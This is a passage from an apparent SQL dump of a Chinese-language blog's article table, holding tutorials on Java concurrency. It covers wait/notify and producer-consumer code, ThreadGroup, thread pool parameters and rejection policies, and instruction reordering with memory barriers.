set,用来存放调用了该对象wait方法之后进入block状态线程\n     * 2. 线程被notify之后,不一定立即得到执行\n     * 3. 线程从wait set中被唤醒的顺序不一定是 FIFO。\n     * 4. 线程被唤醒后,必须重新获取锁,执行记录从wait的位置开始\n     * @param args\n     */\n    public static void main(String[] args) throws InterruptedException {\n        new Thread() {\n            @Override\n            public void run() {\n                work();\n            }\n        }.start();\n        Thread.sleep(1_000);\n        synchronized (LOCK) {\n            LOCK.notify();\n        }\n        IntStream.rangeClosed(1, 10)\n                .forEach(i -> {\n                    new Thread(String.valueOf(i)) {\n                        @Override\n                        public void run() {\n                            synchronized (LOCK) {\n                                try {\n                                    Optional.of(Thread.currentThread().getName() + \" will come to wait set.\").ifPresent(System.out::println);\n                                    LOCK.wait();\n                                    Optional.of(Thread.currentThread().getName() + \" will leave to wait set.\").ifPresent(System.out::println);\n                                } catch (InterruptedException e) {\n                                    e.printStackTrace();\n                                }\n                            }\n                        }\n                    }.start();\n                });\n\n        Thread.sleep(3_000);\n\n        IntStream.rangeClosed(1, 10)\n                .forEach( i ->{\n                    synchronized (LOCK) {\n                        LOCK.notify();\n                        try {\n                            Thread.sleep(1_000);\n                        } catch (InterruptedException e) {\n                            e.printStackTrace();\n                        }\n                    }\n                });\n    }\n}\n\n(1) 所有的对象都会有一个wait set（可以这么理解）,用来存放调用了该对象wait方法之后进入block状态线程\n(2) 线程被notify之后,不一定立即得到执行,而是进入Runnable状态\n(3) 线程从wait set中被唤醒的顺序不一定是FIFO,策略并没有详细的规范定义\n(4) 线程被唤醒后,必须重新获取锁,之所以是从wait位置开始执行是因为wait时记录了执行位置,重新唤醒后恢复执行位置在wait方法处开始执行\n```\n#### wait,notify,notifyAll实现多线程通信\n```java\n// 单生产者与单消费者版本\npublic class ProduceConsumerVersion2 {\n\n    private int i = 0;\n    private final Object LOCK = new Object();\n    private volatile boolean isProduced = false;\n\n    public void produce() {\n        synchronized (LOCK) {\n            if (isProduced) {\n                try {\n                    LOCK.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            } else {\n                i++;\n                System.out.println(\"P->\" + i);\n                LOCK.notify();\n                isProduced = true;\n            }\n        }\n    }\n\n    public void consume() {\n        synchronized (LOCK) {\n            if (isProduced) {\n                System.out.println(\"C->\" + i);\n                LOCK.notify();\n                isProduced = false;\n            } else {\n                try {\n                    LOCK.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        ProduceConsumerVersion2 pc = new ProduceConsumerVersion2();\n        new Thread() {\n            @Override\n            public void run() {\n                while (true) {\n                    pc.produce();\n                }\n            }\n        }.start();\n\n        new Thread() {\n            @Override\n            public void run() {\n                while (true) {\n                    pc.consume();\n                }\n            }\n        }.start();\n    }\n}\n\n// 多生产者与多消费者版本\npublic class ProduceConsumerVersion3 {\n    private int i = 0;\n    private final Object LOCK = new Object();\n    private volatile boolean isProduced = false;\n\n    public void produce() {\n        synchronized (LOCK) {\n            while (isProduced) {\n                try {\n                    LOCK.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            i++;\n            System.out.println(\"P->\" + i);\n            LOCK.notifyAll();\n            isProduced = true;\n        }\n    }\n\n    public void consume() {\n        synchronized (LOCK) {\n            while (!isProduced) {\n                try {\n                    LOCK.wait();\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n            }\n            System.out.println(\"C->\" + i);\n            LOCK.notifyAll();\n            isProduced = false;\n        }\n    }\n\n    public static void main(String[] args) {\n        ProduceConsumerVersion3 pc = new ProduceConsumerVersion3();\n        Stream.of(\"P1\", \"P2\").forEach(n ->\n                new Thread() {\n                    @Override\n                    public void run() {\n                        while (true) {\n                            pc.produce();\n                        }\n                    }\n                }.start()\n        );\n        Stream.of(\"C1\", \"C2\").forEach(n ->\n                new Thread() {\n                    @Override\n                    public void run() {\n                        while (true) {\n                            pc.consume();\n                        }\n                    }\n                }.start()\n        );\n    }\n} \n\n(1) wait(): 使当前线程wait,等价于wait(0),这个对象必须有一个对象监视器(LOCK),这个线程的它释放关于这个锁的所有权,直到有一个线程通过notify或notifyAll将它唤醒,唤醒之后它就具备可运行状态,等待抢到锁\n(2) notify: 唤醒正在该对象的监视器上等待的任意一个线程\n(3) notifyAll: 唤醒正在该对象的监视器上等待的所有线程\n\n```\n#### sleep与wait的区别\n```java\npublic class DifferenceOfWaitAndSleep {\n\n    private final static Object LOCK = new Object();\n\n    public static void main(String[] args) {\n        Stream.of(\"T1\", \"T2\").forEach( name ->\n            new Thread(name) {\n                @Override\n                public void run() {\n                    m1();\n                }\n            }.start()\n        );\n    }\n\n    public static void m1() {\n        synchronized (LOCK) {\n            try {\n                System.out.println(\"The Thread \" + Thread.currentThread().getName() + \"enter.\");\n                Thread.sleep(2_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    public static void m2() {\n        synchronized (LOCK) {\n            try {\n                System.out.println(\"The Thread \" + Thread.currentThread().getName() + \"enter.\");\n                LOCK.wait();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n\n(1) sleep是Thread的方法,wait是Object的方法\n(2) sleep不会释放锁,wait会释放锁,并且把它加入到Object监视器的wait queue中\n(3) sleep并不需要定义syncronized,wait需要定义syncronized\n(4) sleep并不需要被唤醒,wait需要被唤醒(wait(timeout)自动唤醒除外)\n```\n#### 自定义线程工作队列\n```java\npublic class CaptureService {\n\n    private static LinkedList<Control> CONTROLS = new LinkedList<Control>();\n    private final static int MAX_WORKER = 5;\n\n    public static void main(String[] args) {\n        List<Thread> worker = new ArrayList<Thread>();\n        Arrays.asList(\"M1\", \"M2\", \"M3\", \"M4\", \"M5\", \"M6\", \"M7\", \"M8\", \"M9\", \"M10\").stream()\n            .map(CaptureService::createCaptureThread)\n            .forEach(t -> {\n                t.start();\n                worker.add(t);\n            });\n        worker.stream().forEach(t -> {\n            try {\n                t.join();\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        });\n\n        Optional.of(\"All of capture work finished\").ifPresent(System.out::println);\n    }\n\n    private static Thread createCaptureThread(String name) {\n        return new Thread(()->{\n            Optional.of(\"The worker [\" + Thread.currentThread().getName() + \"] begin capture data.\").ifPresent(System.out::println);\n            synchronized (CONTROLS) {\n                while (CONTROLS.size() > MAX_WORKER) {\n                    try {\n                        CONTROLS.wait();\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                    }\n                }\n                CONTROLS.addLast(new Control());\n            }\n            Optional.of(\"The worker [\" + Thread.currentThread().getName() + \"] is working...\").ifPresent(System.out::println);\n            try {\n                Thread.sleep(10_000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            synchronized (CONTROLS) {\n                Optional.of(\"The worker [\" + Thread.currentThread().getName() + \"] END capture data.\").ifPresent(System.out::println);\n                CONTROLS.removeFirst();\n                CONTROLS.notifyAll();\n            }\n        }, name);\n    }\n\n    private static class Control {\n\n    }\n}\n```\n#### 程序终止钩子\n```java\nRuntime.getRuntime().addShutdownHook(new Thread(()->{\n    System.out.println(\"shutdown release resource...\");\n}));\n\n(1) kill pid 可以正常执行钩子\n(2) kill -9 pid 不会正常执行钩子,这种强制终止程序的方式是不推荐的\n\n``` \n\n\n#### 打印执行堆栈\n```java\nArrays.asList(Thread.currentThread().getStackTrace()).stream()\n            .filter(e -> !e.isNativeMethod())\n            .forEach(e -> Optional.of(e.getClassName()+\":\"+e.getMethodName()+\":\"+e.getLineNumber()).ifPresent(System.out::println));\n\n用于打印堆栈,便于查看调用信息\n```\n### ThreadGroup\n#### ThreadGroup是什么\n![并发编程ThreadGroup.png](http://blog.img.tuwq.cn/upload/artimg/2021/7/1626614966_并发编程-ThreadGroup.png)\n```java\n(1) 一个ThreadGroup代表了一组线程,一个ThreadGroup可以包含其他的ThreadGroup\n(2) ThreadGroup是一个树形结构,每次创建的时候都有一个父的ThreadGroup,通过ThreadGroup可以访问自己的thread一些信息\n(3) 如果构造线程对象时未传入ThreadGroup,则Thread会默认获取父线程的ThreadGroup作为该线程的ThreadGroup,此时子线程和父线程将会在同一个threadGroup中,通过threadGroup可以知道这个threadGroup下有多少个线程在运行,从而进行统一管理\n```\n#### thread与threadGroup关系\n```java\n	public static void main(String[] args) throws InterruptedException {\n        ThreadGroup tg1 = new ThreadGroup(\"TG1\");\n        Thread t1 = new Thread(tg1, \"T1\") {\n            @Override\n            public void run() {\n                while (true) {\n                    try {\n                        Thread.sleep(10_000);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                        break;\n                    }\n                }\n            }\n        };\n\n        ThreadGroup tg2 = new ThreadGroup(tg1, \"TG2\");\n        Thread t2 = new Thread(tg2, \"T2\") {\n            @Override\n            public void run() {\n                while (true) {\n                    try {\n                        Thread.sleep(1_000);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                        break;\n                    }\n                }\n            }\n        };\n        t2.start();\n\n        System.out.println(tg1.activeCount());// 有几个thread,2,tg1下有一个直属的thread,tg1下tg2下有一个thread\n        System.out.println(tg1.activeGroupCount());// 有几个threadGroup,1\n        t2.checkAccess();// 确定当前正在运行的线程是否有权修改此线程\n        // tg1.destroy();// 关闭threadGroup以及所有子threadGroup,必须其中的thread必须处于不活跃状态否则抛出IllegalThreadStateException\n\n        // 拷贝一些线程和子threadGroup\n        System.out.println(\"=================================\");\n        Thread[] ts1 = new Thread[tg1.activeCount()];\n        tg1.enumerate(ts1);\n        Arrays.asList(ts1).forEach(System.out::println);\n\n        System.out.println(\"=================================\");\n        tg1.enumerate(ts1, true);\n        Arrays.asList(ts1).forEach(System.out::println);\n\n        System.out.println(\"=================================\");\n        ts1 = new Thread[10];\n        Thread.currentThread().getThreadGroup().enumerate(ts1, true); // true: 包含得到子threadGroup的thread,false: 不包含子threadGroup的thread\n        Arrays.asList(ts1).forEach(System.out::println);\n\n        tg1.interrupt();\n    } \n\n(1) activeCount(): 当前threadGroup下有几个thread,包括子threadGroup的thread\n(2) activeGroupCount(): 当前threadGroup下有几个子threadGroup\n(3) destroy(): 关闭threadGroup以及所有子threadGroup,必须其中的thread必须处于不活跃状态否则抛出IllegalThreadStateException\n(4) enumerate(Thread[], boolean): 遍历拷贝线程,第二个参数决定是否递归获取子threadGroup下的thread\n(5) interrupt(): 中断此threadGroup下的所有thread,包括子threadGroup的thread\n\n```\n#### Daemon与Destroy\n```java\n	ThreadGroup tg1 = new ThreadGroup(\"TG1\");\n        Thread t1 = new Thread(tg1, \"T1\") {\n            @Override\n            public void run() {\n                while (true) {\n                    try {\n                        Thread.sleep(10_000);\n                    } catch (InterruptedException e) {\n                        e.printStackTrace();\n                        break;\n                    }\n                }\n            }\n        };\n        tg1.setDaemon(true); // threadGroup最后一个线程t1线程执行完,那么自动会将threadGroup进入destroy状态,否则不会进入destroy状态\n        t1.start();\n        Thread.sleep(2_000);\n        System.out.println(tg1.isDestroyed());\n        tg1.destroy(); // 也可以手动调用destroy手动回收\n	// 关闭threadGroup以及所有子threadGroup,必须其中的thread必须处于不活跃状态否则抛出IllegalThreadStateException\n\n(1) threadGroup设置Daemon守护线程,那么*当threadGroup中最后一个线程t1线程执行完,那么自动会将threadGroup进入destroy状态*,否则threadGroup不会进入destroy状态\n(2) 也可以通过手动调用destroy()进行关闭\n(3) destroy(): 关闭threadGroup以及所有子threadGroup,必须其中的thread必须处于不活跃状态否则抛出IllegalThreadStateException\n```', 0, 0, 99, 0, 0, '2020-05-10 11:50:55', '2020-05-10 11:50:55', 0, 0);
INSERT INTO `article` VALUES (75, 1, '线程池的基本工作原理', '2019/10/1571221710_mmexport1570975567523.jpg', '### 线程池概述\n```java\n// 什么是线程池\n1. Java中的线程池是运用场景最多的并发框架,几乎所有需要异步或并发执行任务的程序,都可以使用线程池\n2. 将线程集中管理的集合\n\n// 线程池的目的\n1. 降低资源消耗: 通过重复利用已创建的线程降低创建线程和销毁造成的消耗\n2. 提高响应速度: 当任务到达时,任务可以不需要等到线程创建就能立即执行\n3. 提高线程的可管理性。线程是稀缺资源。如果无限制地创建,不仅仅会消耗系统资源,还有降低系统的稳定性,使用线程池可以进行统一分配,调优和监控,但是要做到合理利用\n4. 可有效控制最大并发线程数,提高系统资源利用率,同时可以避免过多的资源竞争,避免阻塞\n\n// new Thread的弊端\n1. 每次new Thread新建对象,性能差\n2. 线程缺乏统一管理,可能无限制的新建线程,相互竞争,有可能占用过多系统资源导致死机或OOM\n3. 缺少更多功能,如更多执行,定期执行,线程中断\n4. 频繁创建多线程,非常占用CPU内存\n\n你可以无限制的不停的创建额外的线程出来，一台机器上，有几千个线程，甚至是几万个线程\n每个线程都有自己的栈内存，占用一定的内存资源，会导致内存资源耗尽，系统也会崩溃掉\n即使内存没有崩溃，会导致你的机器的cpu load，负载,非常高\n\n```\n### 基本工作原理\n![并发编程线程池基本工作原理.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624356101_并发编程-线程池-基本工作原理.png)\n![并发编程线程池新任务处理流程.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624357727_并发编程-线程池-新任务处理流程.png)\n```java\n1. 每次操作线程池执行相当于向一个任务队列中放入新任务\n2. 线程池中的线程会在这个队列上获取任务,得到任务后去执行处理\n3. 执行完你的任务之后，这个线程是不会死掉的，他会尝试从队列里获取新的任务，如果没有新的任务，此时就会阻塞住，等待新的任务到来\n\n// 新创建的核心线程会直接执行任务,任务不进入队列\n如果当前线程池的线程运行数量少于corePoolSize时,线程池会直接创建新线程来处理任务,即使线程池中其他线程时空闲的\n持续提交任务，上述流程反复执行，只要线程池的线程数量小于corePoolSize，都会直接创建新线程来执行这个任务，执行完了就尝试从队列里获取任务，直到线程池里有corePoolSize个线程\n如果线程池发现线程数量已经跟corePoolSize一样大了，此时就直接把任务放入队列中就可以了，线程会争抢获取任务执行的，如果所有的线程此时都在执行任务，那么队列里的任务就可能会越来越多\n1. 如果运行数少于corePoolSize时,直接创建新线程来处理任务,即使线程池中其他线程时空闲的\n2. 如果线程池中的数量大于等于corePoolSize,且小于maximumPoolSize时,只有当workQueue满时,才创建新的线程处理任务\n3. 如果corePoolSize和maximumPoolSize相同的话,那么创建线程池的大小是固定的,这时如果有新的提交,如果workQueue没有满的时候,就把请求放入workQueue中,等待有空闲的线程,从里面取出任务处理\n4. 如果线程数量大于maximumPoolSize时,此时如果workQueue也是满的,那么就会根据策略处理\n5. 首先判断corePoolSize然后workQueue接着maximumPoolSize\n6. 保存等待执行任务的阻塞队列,当我们提交一个新的任务到线程池以后,线程池会根据当前线程池中正在运行中的数量来决定该任务的处理方式,处理方式一共有三种\n7. 当线程池中的线程数量大于corePoolSize时,如果这时没有新的任务提交,核心线程外的线程不会立即销毁而是等待,直到等待时间超过keepAliveTime\n8. 如果workQueue阻塞队列满了,并且没有空闲的线程时,这时还在继续提交任务,这时就需要按照策略来处理这种任务\n\n// 核心参数\n1. corePoolSize: 核心线程数量,实际运用线程数(正式工)\n2. maximumPoolSize: 最大线程数(临时工)\n3. keepAliveTime: 最大线程数销毁前的等待时间(临时工无事时的解雇期限)\n4. unit: 等待时间的时间单位\n5. workQueue: 保存等待执行任务的阻塞队列,当我们提交一个新的任务到线程池以后,线程池会根据当前线程池中正在运行中的数量来决定该任务的处理方式\n6. threadFactory: 线程工厂,用来创建线程,默认有个默认工厂创建线程,使用默认工程创建线程时,会使新创建的线程具有相同的优先级,并且是非守护的线程,同时也设置了线程的名称\n7. rejectHandler: 当拒绝处理任务时的策略,如果workQueue阻塞队列满了,并且没有空闲的线程时,这时还在继续提交任务,这时就需要一种策略来处理这种任务,线程池一共提供了四种策略\n\n// 核心线程数和最大线程数有什么区别\n1. 核心线程数: 实际正式运用线程数\n2. 最大线程数: 线程池最多负载临时创建线程数,会被等待时间销毁\n\n// 根据业务类型和机器配置线程数\nIO密集性:  任务需要大量的IO操作,存在阻塞,浪费CPU资源\nIO密集性:  最大线程数 = 2 乘以 CPU核心数\nCPU密集性: 任务需要大量运算,没有阻塞,不浪费CPU资源\nCPU密集性: 最大线程数 = CPU核心数 + 1\n\n\n// 线程池的四种任务队列处理策略\n// 当任务队列满时的处理策略;除了以下四种策略外,也可以自定义处理策略\n\n// AbortPolicy 异常通知,直接抛出异常\npublic void rejectedExecution(Runnable r, ThreadPoolExecutor e) {\n   throw new RejectedExecutionException(\"Task \" + r.toString() + \" rejected from \" + e.toString());\n} \n\n// DiscardPolicy 拒绝通知,啥也不做,不要使用这个 \npublic void rejectedExecution(Runnable r, ThreadPoolExecutor e) { }\n\n// CallerRunsPolicy 让调用线程来执行,调用线程的其他操作将被阻塞\npublic void rejectedExecution(Runnable r, ThreadPoolExecutor e) {\n   if (!e.isShutdown()) {\n      r.run();\n   }\n}\n\n// DiscardOldestPolicy 把队列中的第一个丢弃,将新的这个任务执行或放入队列中\npublic void rejectedExecution(Runnable r, ThreadPoolExecutor e) {\n   if (!e.isShutdown()) {\n      e.getQueue().poll();\n      e.execute(r);\n   }\n}\n\n// 建议自定义一个reject策略\n如果线程池无法执行更多的任务了，此时可以把这个任务信息持久化写入磁盘里去\n然后后台专门启动一个线程，后续等线程池的工作负载降低了，让它慢慢的从磁盘里读取之前持久化的任务，重新提交到线程池里去执行\n\n// 如果宕机线程池里的任务会丢失\n宕机必然导致线程池里的积压任务全部丢失\n如果这个任务很重要,而且要提交一个任务到线程池里去\n在提交之前,先在数据库里插入这个任务的信息,更新他的状态：未提交、已提交、已完成。\n提交成功之后，再更新他的状态是已提交状态\n系统重启，后台线程去扫描数据库里的未提交和已提交状态的任务,把任务的信息读取出来，重新提交到线程池里去继续进行执行\n\n```\n### 线程池的状态\n![并发编程线程池线程池状态.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624359379_并发编程-线程池-线程池状态.png)\n```java\nrunning状态: 判断新提交的任务并且也能处理阻塞队列中的任务\n\nshutdown状态: 当一个线程池实例处于shutdown状态,不能接受新提交的任务,但是可以处理队列中已经的任务; 在线程池处理running状态时,调用shutdown方法时,会使线程池进入到该状态 \n\nstop状态: 也不接受新提交的任务,也不处理队列中的任务;中断正在处理任务的线程;当线程池处于running状态时,如果调用了shutdownNow方法时,会使线程进入该状态\n\ntidying状态: 如果所有的任务都已经终止了,这时的有效线程数为0,线程池会进入该状态;之后调用terminated方法会进入到terminated状态\n\nterminated状态: 执行完毕,线程池彻底终止\n```\n### JDK提供的API\n```java\n// Executors\n// Executors提供的五种线程池\nCachedThreadPool: \n	(1) 缓存线程池,*因为核心数是0所以会自动销毁*,*动态改变线程数量*\n	(2) 如果线程池长度超过处理需要,可灵活回收空闲线程,若无可回收,则新建线程\n	(3) 最大线程数是Integer.MAX_VALUE, 长时间的大任务不要用这个\n	(4) 远程服务异常的情况下,调用超时，队列变得越来越大，此时会导致内存飙升起来，而且还可能会导致你会OOM，内存溢出\n\nFixedThreadPool: \n	(1) 固定长度线程池,不会自动销毁,核心数10个,最大数10个\n	(2) 最常使用的线程池\n\nSingleThreadExecutor: \n	(1) 单线程化线程执行器,不会自动销毁,它只会用唯一的工作线程来执行任务,保证所有任务按照指定顺序(FIFO,LIFO,优先级)执行\n	(2) 直接new Thread()线程无法*将已提交的可运行对象放入缓存队列*，但是SingleThreadExecutor可以执行此操作。\n\nWorkStealingPool: \n	(1) 工作窃取线程池,会自动销毁,默认使用CPU核心数创建足够多的线程数\n	(2) 它会通过工作窃取的方式，使得多核的 CPU 不会闲置，总会有活着的线程让 CPU 去运行	\n\nScheduledThreadPool: \n	(1) 定时执行线程池,不动自动销毁,自定义线程数量,定时任务即使被调用cancel取消,线程池也不会关闭销毁\n	(2) 支持定时及周期性任务执行,自定义核心数,最大线程数Integer.MAX_VALUE\n	(3) schedule只会执行一次,scheduleAtFixedRate会执行多次\n	(4) 与TimerTask一样,*执行一次任务结束后等待完成再执行下次任务*\n	(5) 每次负责执行的线程可能不同\n\n// 提供的方法\nexecute(): 提交任务,交给线程池执行\nsubmit(): 提交任务,*能够返回执行结果值* Callable+Future\nshutdown(): 关闭线程池,启动线程池的有序关闭过程，其等待已经提交的所有任务完成之后关闭线程池。当调用该方法后，线程池不再接受其他任务。并且*该方法是非阻塞的，不会等待所有任务执行成功后返回*\nshutdownNow(): 关闭线程池,返回当前队列中的线程,不等待任务执行完,*也会关闭正在执行的线程,谨慎使用*\nawaitTermination: shutdown方法被调用之后或参数中定义的timeout时间到达或当前线程被打断，这几种情况任意一个发生了都会导致该方法在所有任务完成之后才返回,*执行该方法会阻塞等待线程池中的任务全部完成*;*超时会导致立即返回,但不会终止线程池的任务执行*\ngetTaskCount(): 线程池已执行和未执行的任务总数\ngetCompletedTaskCount(): 已完成的任务数量\ngetPoolSize(): 线程池当前的线程数量\ngetActiveCount(): 当前线程池中正在执行任务的线程数量\n\n```', 0, 0, 121, 0, 0, '2020-05-16 18:28:38', '2020-05-16 18:28:38', 0, 0);
INSERT INTO `article` VALUES (76, 1, 'Java多线程-有序性', '2018/9/1536570063_c0094338c435dd72664a9599ff5ad188.jpg', '### 有序性问题\n#### 重排序产生的问题\n![并发编程有序性问题.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624801744_并发编程-有序性问题.png)\n```java\n有序性:一个线程观察其他线程中的指令执行顺序,由于指令重排序的存在,该观察结果一般杂乱无序\n处理器为提高运算速度而做出违背代码原有顺序的优化,比如JVM中的重排序\nJava允许编译器和处理器指令进行重排序,但是重排序过程不影响到单线程程序的执行,但会影响到多线程并发执行的正确性\n\n代码有一个问题是指令重排序，编译器和指令器，有的时候为了提高代码执行效率，会将指令重排序\n具备有序性，不会发生指令重排导致我们的代码异常；不具备有序性，可能会发生一些指令重排，导致代码可能会出现一些问题\n我们写好的代码在实际执行的时候那个顺序可能在很多环节都会被人给重排序，一旦重排序之后，在多线程并发的场景下，就有可能会出现一些问题\n\n// 示范\n// 正常逻辑认为执行顺序\n1. momery = allocate() // 分配对象内存空间\n2. ctorInstantce() // 初始化对象\n3. instance = momery // 设置instance指向刚刚分配的内存\n\n// 通过JVM和CPU优化,发生了指令重排序\n1. momery = allocate() // 分配对象内存空间\n2. instance = momery // 设置instance指向刚刚分配的内存\n3. ctorInstantce() // 初始化对象\n\n若在ctorInstantce()还未执行时就使用被赋值的instance对象,使用instance对象会报空指针异常\n从编译到执行的过程中，可能代码的执行顺序可能会有指令重排的地方，只要有指令重排就有一定可能造成程序执行异常\n\n```\n#### Java程序运行过程中发生指令重排的几个地方\n![并发编程有序性发生指令重排的几个地方.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624806449_并发编程-有序性-发生指令重排的几个地方.png)\n```java\n// 静态编译器和动态编译器\n// java里有两种编译器，一个是静态编译器（javac），一个是动态编译器（JIT）。\njavac负责把.java文件中的源代码编译为.class文件中的字节码，这个一般是程序写好之后进行编译的。\nJIT负责把.class文件中的字节码编译为JVM所在操作系统支持的机器码，一般在程序运行过程中进行编译。\n\n静态编译器（javac）是基本上不会执行指令重排序，但是JIT编译器则可能执行指令重排序，指令重排序会在运行时更改代码的执行顺序，可能会导致前后没有关联的语句无序的执行\n比如初始化一个对象实例，这个步骤是有可能很耗时的，比如说可能会在里面执行一些网络的通信，磁盘文件的读写,所以JIT动态编译可能为了加速程序的执行速度,而进行重排序\n比如double check单例模式里面，就是可能会出现这样的JIT指令重排，如果你不加volatile关键字，会导致一些问题的发生\n\n```\n#### 处理器和硬件组件的重排序\n![并发编程有序性处理器重排序.png](http://blog.img.tuwq.cn/upload/artimg/2021/6/1624806449_并发编程-有序性-处理器重排序.png)\n```java\n处理器在实际执行指令的过程中，在硬件层面的组件，也可能会导致指令的执行看起来的顺序跟想象的不太一样\n// 指令乱序执行\n指令不一定是拿到了一个指令就立马执行的\n比如有的指令是要进行网络通信、磁盘读写，获取锁，很多种\n有的指令不是立马就绪可以执行的，为了提升效率，在现代处理器里面都是走的指令的乱序执行机制\n把编译好的指令一条一条读取到处理器里，但是哪个指令先就绪可以执行，就先执行，而不是按照代码顺序来的。\n每个指令的结果放到一个重排序处理器中，重排序处理器把各个指令的结果按照代码顺序应用到主内存或者写缓冲器里\n// 猜测执行\nif(flag) { // 运行完for循环里面的代码再查看条件,决定是否采纳for中的结果\n	for(int i = 0; i < 10; i++) {\n		// 处理器可能先运行这里的代码\n	}\n}\n处理器的乱序执行和猜测执行,都是指令重排序\n\n// 内存重排序\n内存重排序是发生在内存层面的写缓冲器和高速缓存中的\nstore: 处理器将数据写入写缓冲器\nload:  处理器从高速缓存里读数据\n内存重排序，有4种可能性：\n（1）LoadLoad重排序：一个处理器先执行一个L1读操作，再执行一个L2读操作；但是另外一个处理器看到的是先L2再L1\n（2）StoreStore重排序：一个处理器先执行一个W1写操作，再执行一个W2写操作；但是另外一个处理器看到的是先W2再W1\n（3）LoadStore重排序：一个处理器先执行一个L1读操作，再执行一个W2写操作；但是另外一个处理器看到的是先W2再L1\n（4）StoreLoad重排序：一个处理器先执行一个W1写操作，再执行一个L2读操作；但是另外一个处理器看到的是先L2再W1\n写缓冲器和高速缓存执行load和store的过程，都是按照处理器指示的顺序来的，处理器的重排处理器也是按照程序顺序来load和store的\n但写缓冲器可能会为了性能,实际执行时进行了重排序\n写缓冲器和高速缓存都可以自己对Load和Store操作的结果落地到内存进行各种不同的重排序，进而造成上述4种内存重排序问题的发生\n比如处理器A的指示是先W1后W2,但写缓冲器为了性能,他先执行了W2操作，再执行了W1操作\n其他处理器会看到视觉假象,误以为W2写好了,那么W1肯定也好了 直接去执行\n比如\n// 共享变量\nInstance instance = null;\nBoolean flag = true;\n\n// 处理器A\ninstance  = loadNewInstace(); // W1\nflag = false; // W2\n\n// 处理器B\nwhile(flag) { // W2\n	Thread.sleep(1000);\n}\ninstance.method(); // W1\n// 处理器B认为处理器A的顺序是先W1后W2,实际上处理器A的写缓冲器重排序把顺序改成了先W2后W1\n// 当处理器B看到W2好了,那么它认为W1也好了,那么我继续执行吧,如果处理器A的写缓冲器此时仍未结束W1的操作,那么程序此时会报出空指针异常\n\n```\n#### happens-before原则\n```java\n编译器和处理器不是胡乱的重排序的，他们会遵循一个关键的规则，就是数据依赖规则\n如果说一个变量的结果依赖于之前的代码执行结果，那么就不能随意进行重排序，要遵循数据的依赖\n编译器、指令器可能对代码重排序，乱排，要守一定的规则\nhappens-before原则，只要符合happens-before的原则，那么就不能胡乱重排，如果不符合这些规则的话，那就可以自己排序\n// happends-before原则\n1、程序次序规则：一个线程内，按照代码顺序，书写在前面的操作先行发生于书写在后面的操作\n2、锁定规则：一个unLock操作先行发生于后面对同一个锁的lock操作，比如说在代码里有先对一个lock.lock()，lock.unlock()，lock.lock()\n3、volatile变量规则：对一个volatile变量的写操作先行发生于后面对这个volatile变量的读操作，volatile变量写，再是读，必须保证是先写，再读\n4、传递规则：如果操作A先行发生于操作B，而操作B又先行发生于操作C，则可以得出操作A先行发生于操作C\n5、线程启动规则：Thread对象的start()方法先行发生于此线程的每个一个动作，thread.start()，thread.interrupt()\n6、线程中断规则：对线程interrupt()方法的调用先行发生于被中断线程的代码检测到中断事件的发生\n7、线程终结规则：线程中所有的操作都先行发生于线程的终止检测，我们可以通过Thread.join()方法结束、Thread.isAlive()的返回值手段检测到线程已经终止执行\n8、对象终结规则：一个对象的初始化完成先行发生于他的finalize()方法的开始\n上面这8条原则的意思很显而易见，就是程序中的代码如果满足这个条件，就一定会按照这个规则来保证指令的顺序\n规则制定了在一些特殊情况下，不允许编译器、指令器对你写的代码进行指令重排，必须保证你的代码的有序性\n但是如果没满足上面的规则，那么就可能会出现指令重排，就这个意思。\n这8条原则是避免说出现乱七八糟扰乱秩序的指令重排，要求是这几个重要的场景下，比如是按照顺序来，但是8条规则之外，可以随意重排指令。\n\n```\n\n### 解决有序性问题\n```java\n// Java代码保证有序性\n使用volatile关键字或使用synchronized关键字可以保证有序性,禁止重排序\nvolatile和synchronized都会通过加入一些内存屏障保证有序性,解决LoadLoad、StoreStore等等重排序\n\n按照有序性保障来划分的话，内存屏障可以分为Acquire屏障和Release屏障\nAcquire屏障的作用是禁止读操作和读写操作之间发生指令重排序\nRelease屏障的作用是禁止写操作和读写操作之间发生重排序\nAcquire屏障 = LoadLoad屏障 + LoadStore屏障\nRelease屏障 = StoreLoad屏障 + StoreStore屏障\n\n// volatile\nvolatile boolean isRunning = true;\n// -----线程1：\n// -> Release屏障 有序性的屏障\nisRunning = false;\n// -> Store屏障 可见性的屏障\n\n// -----线程2:\n// -> Load屏障 可见性的屏障\nwhile(isRunning) {\n// -> Acquire屏障 有序性的屏障\n// 代码逻辑...\n}\nvolatile变量写操作的前面会加入一个Release屏障，之后会加入一个Store屏障，这样就可以保证volatile写跟Release屏障之前的任何读写操作都不会指令重排，然后Store屏障保证了，写完数据之后，立马会执行flush处理器缓存的操作\nvolatile变量读操作的前面会加入一个Load屏障，这样就可以保证对这个变量的读取时，如果被别的处理器修改过了，必须得从其他处理器的高速缓存或者主内存中加载到自己本地高速缓存里，保证读到的是最新数据；在之后会加入一个Acquire屏障，禁止volatile读操作之后的任何读写操作会跟volatile读指令重排序\n\n// synchronized\nint a = 0;\nint b = 0;\nsynchronized(this) { // -> monitorenter 锁进入\n    // -> Load内存屏障  可见性的屏障\n    // -> Acquire内存屏障 有序性的屏障\n    int c = a; // synchronized代码块里面还是可能会发生指令重排\n    b = 1; // synchronized代码块里面还是可能会发生指令重排\n    // -> Release内存屏障 有序性的屏障\n} // -> monitorexit 锁退出\n// -> Store内存屏障 